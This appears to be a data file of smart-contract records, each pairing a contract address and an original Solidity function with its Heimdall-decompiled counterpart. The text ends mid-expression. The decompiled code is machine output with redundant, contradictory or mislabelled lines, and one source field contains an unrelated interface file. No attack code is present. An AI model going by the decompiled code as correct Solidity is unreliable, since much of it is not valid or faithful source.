{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x4EEB531934eb03F55032CF7468957e9cc3b9Ce7d", "original_solidity_code": "function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }", "heimdall_decompiled_code": "function approveMax(address arg0) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_g[var_a] = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_c = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        emit Approval(msg.sender, address(arg0), 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function burn(uint256 tokenId) external;\\n}\\n\"\r\n    },\r\n    \"contracts/extensions/IERC721AQueryableUpgradeable.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// ERC721A Contracts v4.2.3\\n// Creator: Chiru Labs\\n\\npragma solidity ^0.8.4;\\n\\nimport '../IERC721AUpgradeable.sol';\\n\\n/**\\n * @dev Interface of ERC721AQueryable.\\n */\\ninterface IERC721AQueryableUpgradeable is IERC721AUpgradeable {\\n    /**\\n     * Invalid query range (`start` >= `stop`).\\n     */\\n    error InvalidQueryRange();\\n\\n    /**\\n     * @dev Returns the `TokenOwnership` struct at `tokenId` without reverting.\\n     *\\n     * If the `tokenId` is out of bounds:\\n     *\\n     * - `addr = address(0)`\\n     * - `startTimestamp = 0`\\n     * - `burned = false`\\n     * - `extraData = 0`\\n     *\\n     * If the `tokenId` is burned:\\n     *\\n     * - `addr = <Address of owner before token was burned>`\\n     * - `startTimestamp = <Timestamp when token was burned>`\\n     * - `burned = true`\\n     * - `extraData = <Extra data when token was burned>`\\n     *\\n     * Otherwise:\\n     *\\n     * - `addr = <Address of owner>`\\n     * - `startTimestamp = <Timestamp of start of ownership>`\\n     * - `burned = false`\\n     * - `extraData = <Extra data at start of ownership>`\\n     */\\n    function explicitOwnershipOf(uint256 tokenId) external view returns (TokenOwnership memory);\\n\\n    /**\\n     * @dev Returns an array of `TokenOwnership` structs at `tokenIds` in order.\\n     * See {ERC721AQueryable-explicitOwnershipOf}\\n     */\\n    function explicitOwnershipsOf(uint256[] memory tokenIds) external view returns (TokenOwnership[] memory);\\n\\n    /**\\n     * @dev Returns an array of token IDs owned by `owner`,\\n     * in the range [`start`, `stop`)\\n     * (i.e. `start <= tokenId < stop`).\\n     *\\n     * This function allows for tokens to be queried if the collection\\n     * grows too big for a single call of {ERC721AQueryable-tokensOfOwner}.\\n     *\\n     * Requirements:\\n     *\\n     * - `start < stop`\\n     */\\n    function tokensOfOwnerIn(\\n        address owner,\\n        uint256 start,\\n        uint256 stop\\n    ) external view returns (uint256[] memory);\\n\\n    /**\\n     * @dev Returns an array of token IDs owned by `owner`.\\n     *\\n     * This function scans the ownership mapping and is O(`totalSupply`) in complexity.\\n     * It is meant to be called off-chain.\\n     *\\n     * See {ERC721AQueryable-tokensOfOwnerIn} for splitting the scan into\\n     * multiple smaller scans if the collection is large enough to cause\\n     * an out-of-gas error (10K collections should be fine).\\n     */\\n    function tokensOfOwner(address owner) external view returns (uint256[] memory);\\n}\\n\"\r\n    }", "heimdall_decompiled_code": "function burn(uint256 arg0) public {\n        address var_a = msg.sender;\n        var_b = 0x68;\n        require(storage_map_b[var_a], CustomError_df2d9b42());\n        require(storage_map_b[var_a], CustomError_df2d9b42());\n        require(0x01 > arg0, CustomError_df2d9b42());\n        var_a = arg0;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(0 - storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = arg0;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c46;\n        require(!0x01);\n        require(!storage_map_b[var_a]);\n        storage_map_b[var_a] = 0;\n        var_a = address(storage_map_b[var_a]);\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c45;\n        storage_map_b[var_a] = storage_map_b[var_a] + 0xffffffffffffffffffffffffffffffff;\n        var_a = arg0;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        storage_map_b[var_a] = (address(storage_map_b[var_a])) | ((block.timestamp << 0xa0) | 0x0300000000000000000000000000000000000000000000000000000000);\n        require(0 - (bytes1(storage_map_b[var_a])));\n        var_a = this.code[13919:13951];\n        var_a = var_a;\n        emit Transfer(address(storage_map_b[var_a]), 0, arg0);\n        store_g = 0x01 + store_g;\n        var_a = 0x03;\n        var_b = 0x69;\n        var_a = this.code[13887:13919];\n        var_a = var_a;\n        require(!store_i);\n        var_a = 0x03;\n        var_b = 0x69;\n        var_a = this.code[13887:13919];\n        var_a = var_a;\n        require(store_i);\n        var_a = var_a;\n        require(address(storage_map_j[var_a]) == 0);\n        var_a = 0x03;\n        var_b = 0x69;\n        var_a = this.code[13887:13919];\n        var_a = var_a;\n        require(store_i);\n        var_a = var_a;\n        var_c = 0xb68c437900000000000000000000000000000000000000000000000000000000;\n        address var_d = address(msg.sender);\n        uint256 var_e = 0;\n        uint256 var_f = arg0;\n        require(0x03 < 0x05);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x21;\n        var_h = 0x03;\n        require(address(storage_map_j[var_a]).code.length);\n        (bool success, bytes memory ret0) = address(storage_map_j[var_a]).{ value: var_e ether }Unresolved_b68c4379(var_d); // call\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x32;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x32;\n        var_a = var_f + 0x01;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        if (0 - storage_map_b[var_a]) {\n            require(0 - storage_map_b[var_a], CustomError_59c896be());\n        }\n        require(storage_map_b[var_a] == (address(msg.sender)) | (address(msg.sender) == (address(storage_map_b[var_a]))), CustomError_59c896be());\n        var_a = address(storage_map_b[var_a]);\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c47;\n        var_a = address(msg.sender);\n        address var_b = keccak256(var_a);\n        require(bytes1(storage_map_b[var_a]), CustomError_59c896be());\n        var_a = 0x59c896be00000000000000000000000000000000000000000000000000000000;\n        require(arg0 < totalSupply, CustomError_df2d9b42());\n        var_a = var_f + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = (arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = ((arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = (((arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x436f6e7472616374206973206e6f742072656769737465726564206e6f72204f;\n        var_h = 0x776e657200000000000000000000000000000000000000000000000000000000;\n        require(address(owner) == msg.sender, \"Contract is not registered nor Owner\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x436f6e7472616374206973206e6f742072656769737465726564206e6f72204f;\n        var_h = 0x776e657200000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB997F52A0cF32b5120eD31BEAbaeF3Af6256cb77", "original_solidity_code": "function transferOcOOwnership(address newOwner) external onlyOwner {\\n            OcOpepen(OcO_addr).transferOwnership(newOwner);\\n        }", "heimdall_decompiled_code": "function transferOcOOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_a = 0xf2fde38b00000000000000000000000000000000000000000000000000000000;\n        var_b = address(arg0);\n        require(address(store_h / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_h / 0x01).{ value: 0 ether }Unresolved_f2fde38b(var_b); // call\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x06;\n        address var_c = storage_map_o[var_a];\n        return storage_map_o[var_a];\n    }"}
{"contract_address": "0x5B8BA3cb21F36a06b3a86774103F8dBDa14483EC", "original_solidity_code": "function claimTokens() external {\r\n        uint256 currentPeriod = getCurrentPeriod();\r\n        require(lastClaimedPeriod[msg.sender] < currentPeriod, \"Already claimed for this period\");\r\n\r\n        uint256 totalNFTsOwned = balanceOf(msg.sender);\r\n        require(totalNFTsOwned > 0, \"You don't own any NFTs\");\r\n\r\n        uint256 contractBalance = IERC20(TOKEN_ADDRESS).balanceOf(address(this));\r\n        uint256 tokenAmountPerNFT = contractBalance / MAX_SUPPLY;\r\n\r\n        uint256 totalClaimableAmount = 0;\r\n\r\n        for (uint256 i = 0; i < totalNFTsOwned; i++) {\r\n            uint256 tokenId = tokenOfOwnerByIndex(msg.sender, i);\r\n            if (claimedTokenAmount[tokenId] < tokenAmountPerNFT) {\r\n                uint256 claimableAmount = tokenAmountPerNFT - claimedTokenAmount[tokenId];\r\n                totalClaimableAmount += claimableAmount;\r\n                claimedTokenAmount[tokenId] = tokenAmountPerNFT;\r\n            }\r\n        }\r\n\r\n        require(totalClaimableAmount > 0, \"No tokens to claim\");\r\n        require(IERC20(TOKEN_ADDRESS).transfer(msg.sender, totalClaimableAmount), \"Transfer failed\");\r\n\r\n        lastClaimedPeriod[msg.sender] = currentPeriod;\r\n    }", "heimdall_decompiled_code": "function claimTokens() public payable {\n        require(!(block.timestamp - getCurrentPeriod) > block.timestamp);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(periodDuration);\n        address var_a = address(msg.sender);\n        var_c = 0x0f;\n        require(storage_map_b[var_a] < ((block.timestamp - getCurrentPeriod) / periodDuration));\n        require(address(msg.sender) - 0);\n        var_a = address(msg.sender);\n        var_c = 0x03;\n        require(storage_map_b[var_a] > 0);\n        var_d = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        (bool success, bytes memory ret0) = address(0xfb6b23ade938ed16f769833b2ff92ca26303390b).Unresolved_70a08231(var_e); // staticcall\n        uint256 var_f = var_f + (uint248(ret0.length + 0x1f));\n        require(!((var_f + ret0.length) - var_f) < 0x20);\n        require(var_g == (var_g));\n        require(0x01bc, \"ERC721Enumerable: owner index out of bounds\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(0 < storage_map_b[var_a]), \"ERC721Enumerable: owner index out of bounds\");\n        require(address(msg.sender) - 0, \"ERC721Enumerable: owner index out of bounds\");\n        var_a = address(msg.sender);\n        var_c = 0x03;\n        require(0 < storage_map_b[var_a], \"ERC721Enumerable: owner index out of bounds\");\n        var_a = address(msg.sender);\n        var_c = 0x06;\n        var_a = 0;\n        address var_c = keccak256(var_a);\n        var_a = storage_map_b[var_a];\n        var_c = 0x11;\n        require(!(storage_map_b[var_a] < (var_g / 0x01bc)), \"ERC721Enumerable: owner index out of bounds\");\n        require(0x01, \"ERC721Enumerable: owner index out of bounds\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = storage_map_b[var_a];\n        var_c = 0x11;\n        require(!((var_g / 0x01bc) - storage_map_b[var_a] > (var_g / 0x01bc)), \"ERC721Enumerable: owner index out of bounds\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(0 > (0 + ((var_g / 0x01bc) - storage_map_b[var_a]))), \"ERC721Enumerable: owner index out of bounds\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = storage_map_b[var_a];\n        var_c = 0x11;\n        storage_map_b[var_a] = (var_g) / 0x01bc;\n        require(0x01, \"ERC721Enumerable: owner index out of bounds\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_h = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_j = 0x2b;\n        var_k = 0x455243373231456e756d657261626c653a206f776e657220696e646578206f75;\n        var_l = 0x74206f6620626f756e6473000000000000000000000000000000000000000000;\n        var_h = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_i = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_j = 0x29;\n        var_k = 0x4552433732313a2061646472657373207a65726f206973206e6f742061207661;\n        var_l = 0x6c6964206f776e65720000000000000000000000000000000000000000000000;\n        require(0 > 0);\n        var_h = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        var_i = address(msg.sender);\n        uint256 var_j = 0;\n        (bool success, bytes memory ret0) = address(0xfb6b23ade938ed16f769833b2ff92ca26303390b).{ value: var_j ether }Unresolved_a9059cbb(var_i); // call\n        var_f = var_f + (uint248(ret0.length + 0x1f));\n        require(!(((var_f + ret0.length) - var_f) < 0x20), \"Transfer failed\");\n        require(var_g == (var_g), \"Transfer failed\");\n        require(var_g, \"Transfer failed\");\n        var_m = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_j = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_k = 0x0f;\n        var_l = 0x5472616e73666572206661696c65640000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_c = 0x0f;\n        storage_map_b[var_a] = (block.timestamp - getCurrentPeriod) / periodDuration;\n        var_h = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_i = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_j = 0x12;\n        var_k = 0x4e6f20746f6b656e7320746f20636c61696d0000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x16;\n        var_j = 0x596f7520646f6e2774206f776e20616e79204e46547300000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x29;\n        var_j = 0x4552433732313a2061646472657373207a65726f206973206e6f742061207661;\n        var_k = 0x6c6964206f776e65720000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x1f;\n        var_j = 0x416c726561647920636c61696d656420666f72207468697320706572696f6400;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n    }"}
{"contract_address": "0xEA96F358096DB436A74f5C974F59fdE3Bc5185e7", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"You are trying to transfer more than your balance\");\n        require(address(arg0), \"You are trying to transfer more than your balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x18;\n        require(!(arg1 > storage_map_b[var_a]), \"You are trying to transfer more than your balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x31;\n        var_f = 0x596f752061726520747279696e6720746f207472616e73666572206d6f726520;\n        var_g = 0x7468616e20796f75722062616c616e6365000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(address(uniPairAddy) == (address(msg.sender)), \"ERC20: transfer to the zero address\");\n        require(!(arg1 > _maxxTransferSize), \"ERC20: transfer to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x17;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(arg1 > _maxxTrxSize), \"ERC20: transfer to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x17;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(address(uniPairAddy) == (address(arg0))), \"ERC20: transfer to the zero address\");\n        require(!(address(uniPairAddy) == (address(arg0))), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x18;\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x18;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(arg0);\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(arg0);\n        var_b = 0x18;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_a = address(arg0);\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(address(arg0) - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(address(msg.sender) - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(!(store_g > 0), \"ERC20: transfer to the zero address\");\n        require(address(arg0) - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(address(msg.sender) - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(store_h, \"ERC20: transfer to the zero address\");\n        require((store_g == ((store_g * (arg1 / store_h)) / (arg1 / store_h))) | (!arg1 / store_h), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] > ((store_g * (arg1 / store_h)) + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        storage_map_b[var_a] = (store_g * (arg1 / store_h)) + storage_map_b[var_a];\n        var_c = store_g * (arg1 / store_h);\n        emit Transfer(address(msg.sender), address(this), store_g * (arg1 / store_h));\n        require(!(store_i > 0), \"ERC20: transfer to the zero address\");\n        require(address(arg0) - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(address(msg.sender) - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(!(store_g > store_i), \"ERC20: transfer to the zero address\");\n        require(store_h, \"ERC20: transfer to the zero address\");\n        require((store_i == ((store_i * (arg1 / store_h)) / (arg1 / store_h))) | (!arg1 / store_h), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(this), \"ERC20: transfer to the zero address\");\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x18;\n        require(!((store_i * (arg1 / store_h)) > storage_map_b[var_a]), \"You are trying to transfer more than your balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x31;\n        var_f = 0x596f752061726520747279696e6720746f207472616e73666572206d6f726520;\n        var_g = 0x7468616e20796f75722062616c616e6365000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(address(uniPairAddy) == (address(this)), \"ERC20: transfer to the zero address\");\n        require(!((store_i * (arg1 / store_h)) > _maxxTransferSize), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(!((store_i * (arg1 / store_h)) > _maxxTrxSize), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(address(uniPairAddy) == 0xdead), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] - (store_i * (arg1 / store_h)) > storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        storage_map_b[var_a] = storage_map_b[var_a] - (store_i * (arg1 / store_h));\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0xdead;\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] > ((store_i * (arg1 / store_h)) + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = 0xdead;\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(!(store_j > 0), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(store_h, \"ERC20: transfer to the zero address\");\n        require((store_j == ((store_j * ((store_i * (arg1 / store_h)) / store_h)) / ((store_i * (arg1 / store_h)) / store_h))) | (!(store_i * (arg1 / store_h)) / store_h), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] > ((store_j * ((store_i * (arg1 / store_h)) / store_h)) + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        storage_map_b[var_a] = (store_j * ((store_i * (arg1 / store_h)) / store_h)) + storage_map_b[var_a];\n        var_c = store_j * ((store_i * (arg1 / store_h)) / store_h);\n        emit Transfer(address(this), address(this), store_j * ((store_i * (arg1 / store_h)) / store_h));\n        require(!(store_i > 0), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(!(store_j > store_i), \"ERC20: transfer to the zero address\");\n        require(store_h, \"ERC20: transfer to the zero address\");\n        require((store_i == ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / ((store_i * (arg1 / store_h)) / store_h))) | (!(store_i * (arg1 / store_h)) / store_h), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(this), \"ERC20: transfer to the zero address\");\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x18;\n        require(!((store_i * ((store_i * (arg1 / store_h)) 